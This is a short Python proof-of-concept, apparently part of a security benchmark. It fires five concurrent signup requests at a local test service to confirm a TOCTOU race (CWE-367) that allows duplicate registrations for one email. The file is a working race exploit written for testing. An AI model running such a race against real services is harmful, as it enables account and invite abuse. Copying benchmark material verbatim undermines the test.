"""PoC: TOCTOU race in invite signup via goroutine (CWE-367)."""

import time
from benchmark.chains.poc_templates import ReplayRaceTemplate


class HasuraSignupRaceExploit(ReplayRaceTemplate):
    """TOCTOU race — email check in main goroutine, registration in background."""

    def __init__(self, base_url: str = "http://localhost:39180"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "hasura_signup_race"

    def execute(self) -> tuple[bool, str]:
        email = f"racetest_{int(time.time())}@example.com"
        num = 5

        def send_signup(idx):
            return self.http_post("/invite/signup", json={
                "email": email,
                "code": f"INVITE-{idx}",
            })

        results, errors = self.concurrent(num, send_signup)
        time.sleep(3)

        success = sum(1 for r in results if r and r.ok)
        already = sum(1 for r in results if r and "already_registered" in (r.text if r else ""))
        conflict = sum(1 for r in results if r and r.status_code == 409)

        # Check final state
        status_resp = self.http_get("/invite/status", params={"email": email})
        signup_count = 0
        if status_resp.ok:
            data = status_resp.json()
            signup_count = data.get("signup_count", 0)

        evidence = (
            f"Sent {num} concurrent signups for {email}. "
            f"Accepted: {success}, already_registered: {already}, "
            f"conflict: {conflict}, signup_count: {signup_count}."
        )

        if signup_count > 1:
            return True, (
                f"CWE-367 TOCTOU confirmed: signup_count={signup_count} "
                f"(expected 1). Email uniqueness check runs in main goroutine "
                f"but registration happens in background. " + evidence
            )

        if success > 1 and already == 0 and conflict == 0:
            return True, (
                f"CWE-367 likely: {success} signups accepted without rejection. "
                + evidence
            )

        return False, f"No duplicate signup detected. " + evidence
